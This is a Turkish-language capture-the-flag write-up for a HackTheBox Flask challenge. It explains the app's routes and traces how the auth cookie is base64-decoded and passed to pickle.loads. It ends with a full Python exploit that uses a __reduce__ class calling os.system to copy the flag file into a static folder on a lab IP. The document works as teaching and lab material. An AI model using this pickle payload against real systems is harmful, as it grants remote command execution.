---
{"dg-publish":true,"permalink":"/ctf/spellbound-servants-challenges/"}
---


### Gerekli Beceriler

* Proxy araçları, örneğin Burp Suite / OWASP ZAP aracılığıyla HTTP isteklerini engelleme.

* Python Flask framework hakkında temel anlayış.


### Öğrenilen Beceriler

Güvenli olmayan pickle deserialization'dan yararlanma.

### Çözüm

### Uygulamaya Genel Bakış

Uygulama ana sayfasını ziyaret etmek bize aşağıdaki girişi verir:

![Pasted image 20250129205245.png](/img/user/resimler/Pasted%20image%2020250129205245.png)

Kaydolduktan ve giriş yaptıktan sonra aşağıdaki ana sayfaya ulaşıyoruz:

![Pasted image 20250129205327.png](/img/user/resimler/Pasted%20image%2020250129205327.png)

Uygulamanın sahip olduğu fonksiyonellik budur. Kaynak koduna bir göz atalım.


### Unsafe Pickle Deserialization

routes.py dosyasında tanımlanan login fonksiyonuna baktığımızda

```
from application.database import *
from flask import Blueprint, redirect, render_template, request, make_response
from application.util import response, isAuthenticated

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/', methods=['GET', 'POST'])
def loginView():
    return render_template('login.html')

@web.route('/register', methods=['GET', 'POST'])
def registerView():
    return render_template('register.html')

@web.route('/home', methods=['GET', 'POST'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user)

@api.route('/login', methods=['POST'])
def api_login():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        res = make_response(response('Logged In sucessfully'))
        res.set_cookie('auth', user)
        return res
        
    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = register_user_db(username, password)
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

```


Bu kod, bir Flask web uygulamasına ait temel yönlendirmeleri ve API end pointlerine içeriyor. Uygulama, kullanıcıları giriş yapma, kayıt olma ve ana sayfayı görüntüleme işlevsellikleriyle yönetiyor. İşte detaylı açıklamalar:

---

### Web Blueprint (`web`):

1. **`/` (GET, POST)** - **loginView**:
    
    - **GET** ve **POST** istekleri için çalışır.
    - Kullanıcıdan giriş bilgilerini almak için `login.html` template'ini render eder.
2. **`/register` (GET, POST)** - **registerView**:
    
    - **GET** ve **POST** istekleri için çalışır.
    - Kullanıcıdan kayıt bilgilerini almak için `register.html` şablonunu render eder.
3. **`/home` (GET, POST)** - **homeView**:
    
    - **GET** ve **POST** istekleri için çalışır, ancak kullanıcı oturumu kontrol edilir (`@isAuthenticated` decorator ile).
    - Kullanıcı giriş yaptıysa `index.html` template'ini render eder ve kullanıcı bilgilerini (`user`) template'ine geçirir.

### API Blueprint (`api`):

1. **`/login` (POST)** - **api_login**:
    
    - **POST** isteği ile kullanıcı girişini kontrol eder.
    - Eğer istek JSON formatında değilse, `Invalid JSON!` mesajıyla 400 hata kodu döner.
    - Kullanıcı adı ve şifreyi JSON verisinden alır.
    - Eğer eksik bilgi varsa, `All fields are required!` mesajı ve 401 hata kodu döner.
    - `login_user_db` fonksiyonu kullanılarak kullanıcı doğrulaması yapılır. Kullanıcı başarıyla giriş yaparsa:
        - `auth` isimli bir cookie kullanıcı bilgisi kaydedilir.
        - Başarılı giriş mesajı ile yanıt döner.
    - Eğer kullanıcı geçerli değilse, `Invalid credentials!` mesajı ile 403 hata kodu döner.
2. **`/register` (POST)** - **api_register**:
    
    - **POST** isteği ile kullanıcı kaydını yapar.
    - Eğer istek JSON formatında değilse, `Invalid JSON!` mesajıyla 400 hata kodu döner.
    - Kullanıcı adı ve şifreyi JSON verisinden alır.
    - Eğer eksik bilgi varsa, `All fields are required!` mesajı ve 401 hata kodu döner.
    - `register_user_db` fonksiyonu kullanılarak yeni kullanıcı kaydedilir. Kayıt başarılıysa:
        - Kullanıcıya, giriş yapmaları gerektiği mesajını döner.
    - Eğer kullanıcı zaten varsa, `User already exists!` mesajı ile 403 hata kodu döner.

### Yardımcı Fonksiyonlar:

- **`response`**: Uygulama genelinde JSON formatında yanıt dönen yardımcı bir fonksiyon. (Detayları burada tanımlı değil ama genellikle response mesajlarını JSON formatında göndermek için kullanılır.)
- **`isAuthenticated`**: Kullanıcı oturumunun doğruluğunu kontrol eden bir dekoratördür. Eğer kullanıcı giriş yapmamışsa, `homeView` fonksiyonu çalıştırılmaz.

### Cookie:

- Başarılı giriş sonrası, kullanıcının kimliğini doğrulamak için **`auth`** isimli bir cookie oluşturulur.

### Genel Akış:

1. Kullanıcı giriş yapmak istediğinde `/login` API'sine **POST** isteği gönderir.
2. Kullanıcı kayıt olmak istediğinde `/register` API'sine **POST** isteği gönderir.
3. Giriş yapmış kullanıcılar `/home` sayfasına erişebilirler, aksi takdirde bu sayfaya yönlendirilmezler.

Bu yapıda, kullanıcı oturum açma ve kaydolma işlemleri web sayfaları üzerinden yapılırken, API üzerinden de aynı işlemler gerçekleştirilir.


---

Login fonksiyonunun kendisi mükemmel ve güvenli görünüyor. home rotası, utils.py dosyasında tanımlanan isAuthenticated adlı bir decorator fonksiyonu kullanır. Şimdi bu fonksiyona bir göz atalım.

```
import os, pickle, base64
from flask import jsonify, abort, session, request
from functools import wraps

generate = lambda x: os.urandom(x).hex()
key = generate(50)

def response(message):
    return jsonify({'message': message})

def isAuthenticated(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = request.cookies.get('auth', False)

        if not token:
            return abort(401, 'Unauthorised access detected!')
        
        try:
            user = pickle.loads(base64.urlsafe_b64decode(token))
            kwargs['user'] = user
            return f(*args, **kwargs)
        except:
            return abort(401, 'Unauthorised access detected!')

    return decorator
```


Yukarıdaki fonksiyon auth adlı cookie'yi alır ve eğer cookie mevcut değilse 401 Unauthorized yanıtı döndürür, ancak cookie mevcutsa cookie'nin base64 kodunu çözer ve üzerinde pickle.loads kullanır. Uygulama, güvenilmeyen verilerin kodunu çözüyor (“deserializing”) ve bu da komutun yürütülmesine neden oluyor

Bunu, bir sınıfta `__reduce__` metodunu uygulayarak exploit edebiliriz; bu sınıfın örneklerini pickle (serileştirme) edeceğiz. Pickle process'i sırasında çalıştırılacak bir callable (çağrılabilir) ve bazı argümanlar verebiliriz. Objeleri yeniden yapılandırmak için tasarlanmış olmasına rağmen, bunu kötüye kullanarak kodumuzu çalıştırmamız mümkün olur.

Bayrağı almak için aşağıdaki exploit'i kullanabiliriz

```
import requests
import pickle
import base64
import os
import time

url = 'http://83.136.253.1:57729'  # Hedef IP ve port
payload = f'cat /flag.txt > /app/application/static/js/flag.txt'

class RCE:
    def __reduce__(self):
        cmd = payload
        return os.system, (cmd,)

def exploit():
    pickled = pickle.dumps(RCE())
    r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
    
    while True:
        flag = requests.get(f'{url}/static/js/flag.txt')
        if 'HTB'.encode('utf-8') in flag.content:
            break
        time.sleep(5)
    
    print('[*] %s' % flag.content)

exploit()

```


![Pasted image 20250129211608.png](/img/user/resimler/Pasted%20image%2020250129211608.png)
